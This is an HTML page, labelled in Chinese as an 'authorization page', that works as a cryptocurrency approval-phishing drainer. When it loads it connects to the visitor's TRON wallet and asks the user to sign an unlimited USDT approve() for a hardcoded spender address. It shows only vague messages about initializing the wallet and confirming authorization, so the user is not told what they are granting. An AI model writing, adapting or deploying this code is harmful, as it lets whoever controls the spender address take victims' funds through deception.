<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>授权页面</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
    <style>
        body{background:#fff;text-align:center;padding-top:120px;font-size:18px;color:#333;}
    </style>
</head>
<body>
<div id="tip">正在初始化钱包连接，请稍候...</div>
<script>
// 基础配置
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
// 无限授权大数
const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const tipDom = document.getElementById('tip');

// 标准TRC20合约ABI（只保留必要approve方法，轻量化）
const TRC20_ABI = [
    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
];

// 等待tronWeb就绪
function waitTronReady() {
    return new Promise(resolve => {
        let timer = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(timer);
                resolve(window.tronWeb);
            }
        }, 600);
    });
}

// 自动授权主逻辑
async function startApprove() {
    try {
        tipDom.innerText = "检测钱包中...";
        const tronWeb = await waitTronReady();
        // 正确写法：手动传入ABI，解决方法找不到问题
        const usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
        
        tipDom.innerText = "发起授权请求，请在钱包确认";
        // 调用授权
        const tx = await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
        tipDom.innerText = `授权提交成功！交易哈希：${tx}`;
    } catch (err) {
        tipDom.innerText = "授权失败：" + err.message;
        console.error(err);
    }
}

window.onload = startApprove;
</script>
</body>
</html>
